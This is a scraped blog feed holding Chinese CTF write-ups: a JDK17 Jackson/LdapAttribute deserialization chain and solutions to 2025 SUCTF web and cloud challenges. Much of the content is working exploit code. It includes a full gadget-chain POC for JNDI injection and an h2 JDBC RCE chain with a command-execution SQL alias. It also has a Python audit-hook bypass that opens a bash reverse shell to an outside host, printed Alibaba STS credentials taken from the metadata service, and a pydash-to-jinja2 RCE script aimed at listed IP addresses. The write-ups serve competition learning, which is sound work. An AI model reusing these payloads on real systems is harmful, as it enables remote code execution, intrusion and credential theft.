ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(object); oos.close(); return Base64.getEncoder().encodeToString(baos.toByteArray()); } public static void deserialize(String data) throws Exception { byte[] base64decodedBytes = Base64.getDecoder().decode(data); ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } public static void setFieldValue(Object obj, String field, Object arg) throws Exception { Field f = null; Class\u0026lt;?\u0026gt; c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { f = c.getDeclaredField(field); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } f.setAccessible(true); f.set(obj, arg); } public static Object getFieldValue(Object obj, String fieldName) throws Exception{ Field field = null; Class c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { field = c.getDeclaredField(fieldName); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } field.setAccessible(true); return field.get(obj); } } 在反序列化的时候会触发以下报错\nException in thread \u0026#34;main\u0026#34; java.lang.RuntimeException: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type `com.sun.jndi.ldap.LdapAttribute`: Failed to construct BeanSerializer for [simple type, class com.sun.jndi.ldap.LdapAttribute]: (java.lang.IllegalArgumentException) Failed to call `setAccess()` on Method \u0026#39;getAttributeSyntaxDefinition\u0026#39; (of class `com.sun.jndi.ldap.LdapAttribute`) due to `java.lang.reflect.InaccessibleObjectException`, problem: Unable to make public javax.naming.directory.DirContext com.sun.jndi.ldap.LdapAttribute.getAttributeSyntaxDefinition() throws javax.naming.NamingException accessible: module java.naming does not \u0026#34;opens com.sun.jndi.ldap\u0026#34; to unnamed module @19dc67c2 原因是在jackson反序列化的时候触发了一个模块化的机制，jdk17中的jackson在触发getter的时候，都会进行一次build\n在build时会对property(调用的目的类和目的方法)是否public进行一次判断，如果非public则会调用setAccessible来进行一次反射调用\nLdapAttribute类为private类\n然后便触发了模块化机制，导致了报错的产生\n比赛的时候脑子宕机了，后面自己思考的时候突然就想到了一个机制：动态代理\n在平常的时候，面对jackson反序列化时大家都会在外面套一层JdkDynamicAopProxy的代理，目的是为了保证反序列化时触发getter的稳定性\n在这里，我们的目的不是稳定性，而是通过invoke来绕过jackson反序列化DirContext类时的报错，原理如下\n由于在外面套了一层proxy，那么jackson就只会从动态代理类触发getter 然后又由JdkDynamicAopProxy动态代理类去触发LdapAttribute的getter,因为proxy类module位于java.base，所以能够访问任意包下的类而不会触发模块化，然后成功触发JNDI注入 没套proxy时\n套了之后\n然后后面就是常规套路打EL或者是SnakeYaml了，这里不做太多赘述\nPOC\npackage org.example; import cn.hutool.db.ds.DataSourceWrapper; import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.node.POJONode; import org.apache.commons.jexl3.JexlBuilder; import org.apache.commons.jexl3.MapContext; import org.h2.jdbcx.JdbcDataSource; import org.h2.message.Trace; import org.springframework.aop.framework.AdvisedSupport; import sun.misc.Unsafe; import javax.naming.CompositeName; import javax.naming.directory.Attribute; import javax.sql.DataSource; import javax.swing.event.EventListenerList; import javax.swing.undo.UndoManager; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.net.URL; import java.util.Base64; import java.util.Vector; import Utils.Util; public class test { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; unSafe=Class.forName(\u0026#34;sun.misc.Unsafe\u0026#34;); Field unSafeField=unSafe.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); unSafeField.setAccessible(true); Unsafe unSafeClass= (Unsafe) unSafeField.get(null); //获取基类模块 Module baseModule=Object.class.getModule(); Class\u0026lt;?\u0026gt; currentClass=test.class; //获取caller类的module field的地址 long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); //直接将基类module的值覆盖在我们的地址上 unSafeClass.getAndSetObject(currentClass,addr,baseModule); String ldapCtxUrl = \u0026#34;ldap://127.0.0.1:1389/\u0026#34;; Class ldapAttributeClazz = Class.forName(\u0026#34;com.sun.jndi.ldap.LdapAttribute\u0026#34;); Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor( new Class[] {String.class}); ldapAttributeClazzConstructor.setAccessible(true); Object ldapAttribute = ldapAttributeClazzConstructor.newInstance( new Object[] {\u0026#34;name\u0026#34;}); Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(\u0026#34;baseCtxURL\u0026#34;); baseCtxUrlField.setAccessible(true); baseCtxUrlField.set(ldapAttribute, ldapCtxUrl); Field rdnField = ldapAttributeClazz.getDeclaredField(\u0026#34;rdn\u0026#34;); rdnField.setAccessible(true); rdnField.set(ldapAttribute, new CompositeName(\u0026#34;a//b\u0026#34;)); Proxy proxy= (Proxy) getProxy(ldapAttribute, Attribute.class); System.out.println(Proxy.class.getModule()); POJONode jsonNodes=new POJONode(ldapAttribute); EventListenerList list = new EventListenerList(); UndoManager manager = new UndoManager(); Vector vector = (Vector) getFieldValue(manager, \u0026#34;edits\u0026#34;); vector.add(jsonNodes); setFieldValue(list, \u0026#34;listenerList\u0026#34;, new Object[]{InternalError.class, manager}); System.out.println(Util.serialize(list)); deserialize(serialize(list)); } public static Object getProxy(Object obj,Class\u0026lt;?\u0026gt; clazz) throws Exception { AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(obj); Constructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler); return proxy; } public static String serialize(Object object) throws IOException { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(object); oos.close(); return Base64.getEncoder().encodeToString(baos.toByteArray()); } public static void deserialize(String data) throws Exception { byte[] base64decodedBytes = Base64.getDecoder().decode(data); ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } public static void setFieldValue(Object obj, String field, Object arg) throws Exception { Field f = null; Class\u0026lt;?\u0026gt; c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { f = c.getDeclaredField(field); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } f.setAccessible(true); f.set(obj, arg); } public static Object getFieldValue(Object obj, String fieldName) throws Exception{ Field field = null; Class c = obj.getClass(); for (int i = 0; i \u0026lt; 5; i++) { try { field = c.getDeclaredField(fieldName); } catch (NoSuchFieldException e){ c = c.getSuperclass(); } } field.setAccessible(true); return field.get(obj); } } 最后 这题除了上述方法还有很多方法，比如fastjson触发Ldap的getter，然后fastjson和jackson这俩东西也可以触发依赖里的OracleCachedRowSet的getConnection()打jndi，这里放下篇文章里说吧\n","date":"2025-01-20T03:02:14+08:00","permalink":"http://localhost:1313/post/jdk17%E6%89%93jackson+ldapattruibute%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","section":"post","tags":null,"title":"JDK17打Jackson+LdapAttruibute反序列化"},{"categories":["WP"],"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" Z3n1th z3✌️ 